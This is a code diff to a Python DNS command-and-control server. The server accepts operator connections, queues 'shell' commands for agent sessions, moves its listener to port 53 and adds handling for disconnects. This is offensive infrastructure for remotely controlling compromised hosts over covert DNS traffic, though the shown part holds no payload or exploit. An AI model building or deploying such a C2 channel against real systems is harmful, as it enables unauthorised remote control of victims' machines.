@@ -11,7 +11,8 @@ session_locks = {}  # {session_id: threading.Lock()}
 operators = {}
 current_output = []  # Buffer for collecting output chunks
 
-SECRET_KEY = b'' # Generate a secret with `secrets.token_bytes(32)` and replace it in the agent and server script
+SECRET_KEY = b''
+ # Generate a secret with `secrets.token_bytes(32)` and replace it in the agent and server script
 
 def handle_operator_connection(operator_sock):
     operators[operator_sock] = None  # Initialize with no selected session
@@ -39,22 +40,32 @@ def handle_operator_connection(operator_sock):
 
             elif command.startswith("shell ") and operators[operator_sock]:
                 selected_session = operators[operator_sock]
-                with session_locks[selected_session]:
-                    command_queues[selected_session].put(command)
-                    #operator_sock.sendall(f"Queued command for {selected_session}: {command}\n".encode())
+                if selected_session in command_queues:
+                    with session_locks[selected_session]:
+                        command_queues[selected_session].put(command)
+                else:
+                    operator_sock.sendall("Session is no longer active.\n".encode())
 
-            elif command == "exit":
+            elif command.startswith("exit"):
+                print("Operator disconnected.")
                 operator_sock.sendall("Goodbye!\n".encode())
-                break
+                del operators[operator_sock]
+                operator_sock.close()
 
             else:
                 operator_sock.sendall("Unknown command or no session selected.\n".encode())
 
+    except (ConnectionResetError, BrokenPipeError):
+        print(f"Operator disconnected unexpectedly.")
     except Exception as e:
-        print(f"Error handling operator connection: {e}")
+        if operator_sock.fileno() == -1:
+            print("Operator connection closed.")
+        else:
+            print(f"Error handling operator connection: {e}")
     finally:
+        if operator_sock in operators:
+            del operators[operator_sock]  # Remove operator from dictionary
         operator_sock.close()
-        del operators[operator_sock]  # Remove operator from dictionary
 
 
 
@@ -133,8 +144,7 @@ def start_operator_server(host="0.0.0.0", port=9000):
         threading.Thread(target=handle_operator_connection, args=(conn,), daemon=True).start()
 
 
-# Start the DNS server on port 9053
-def start_dns_server(host="0.0.0.0", port=9053):
+def start_dns_server(host="0.0.0.0", port=53):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((host, port))
     print(f"DNS C2 server running on {host}:{port}")
